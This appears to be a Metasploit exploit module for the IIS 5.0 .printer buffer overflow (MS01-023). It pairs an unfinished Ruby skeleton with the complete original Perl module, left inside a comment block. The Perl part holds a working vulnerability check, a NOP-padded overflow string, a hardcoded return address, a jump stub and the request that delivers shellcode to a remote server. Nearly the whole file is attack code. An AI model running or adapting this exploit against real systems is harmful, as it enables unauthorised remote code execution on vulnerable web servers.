require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'IIS 5.0 Printer Buffer Overflow',
			'Description'    => %q{
				This exploits a buffer overflow in the request processor of
				the Internet Printing Protocol ISAPI module in IIS. This
				module works against Windows 2000 service pack 0 and 1. If
				the service stops responding after a successful compromise,
				run the exploit a couple more times to completely kill the
				hung process.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '3323'],
					[ 'MSB', 'MS01-023'],
					[ 'URL', 'http://seclists.org/lists/bugtraq/2001/May/0005.html'],
					[ 'MIL', '27'],

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 900,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'May 1 2001',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::iis50_printer_overflow;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'IIS 5.0 Printer Buffer Overflow',
	'Version'  => '$Revision$',
	'Authors' => [ 'H D Moore <hdm [at] metasploit.com>', ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000' ],
	'Priv'  => 0,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Payload' =>
	  {
		'Space'  => 900,
		'BadChars'  => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
	  },

	'Description'  => Pex::Text::Freeform(qq{
        This exploits a buffer overflow in the request processor of
        the Internet Printing Protocol ISAPI module in IIS. This
        module works against Windows 2000 service pack 0 and 1. If
        the service stops responding after a successful compromise,
        run the exploit a couple more times to completely kill the
        hung process.
}),

	'Refs'  =>
	  [
		['OSVDB', '3323'],
		['MSB',   'MS01-023'],
		['URL',   'http://seclists.org/lists/bugtraq/2001/May/0005.html'],
		['MIL',   '27'],
	  ],

	'DefaultTarget' => 0,
	'Targets' => [['Windows 2000 SP0/SP1', 0x732c45f3]],

	'Keys' => ['iis'],

	'DisclosureDate' => 'May 1 2001',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET /NULL.printer\r\n\r\n");
	my $res = $s->Recv(-1, 5);
	$s->Close();

	if ($res !~ /Error in web printer/) {
		$self->PrintLine("[*] Server may not have the .printer extension mapped");
		return $self->CheckCode('Safe');
	}

	# Now send a mini-overflow to see if the service is vulnerable
	$s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("GET /NULL.printer\r\nHost: " . ("META" x 64) . "P\r\n\r\n");
	$res = $s->Recv(-1, 5);
	$s->Close();

	if ($res =~ /locked out/) {
		$self->PrintLine("[*] The IUSR account is locked account, we can't check");
		return $self->CheckCode('Detected');
	}
	elsif ($res =~ /HTTP\/1\.1 500/) {
		$self->PrintLine("[*] The system appears to be vulnerable");
		return $self->CheckCode('Appears');
	}

	$self->PrintLine("[*] The system does not appear to be vulnerable");
	return $self->CheckCode('Safe');
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $pattern = $self->MakeNops(280);
	substr($pattern, 268, 4, pack("V", $target->[1]));

	# payload is at: [ebx + 96] + 256 + 64
	$pattern .= "\x8b\x4b\x60";         # mov ecx, [ebx + 96]
	$pattern .= "\x80\xc1\x40";         # add cl, 64
	$pattern .= "\x80\xc5\x01";         # add ch, 1
	$pattern .= "\xff\xe1";             # jmp ecx

	my $request = "GET http://$pattern/null.printer?$shellcode HTTP/1.0\r\n\r\n";

	$self->PrintLine(sprintf ("[*] Trying ".$target->[0]." using return to esp at 0x%.8x...", $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($request);
	$s->Close();
	return;
}


=end


end
end	
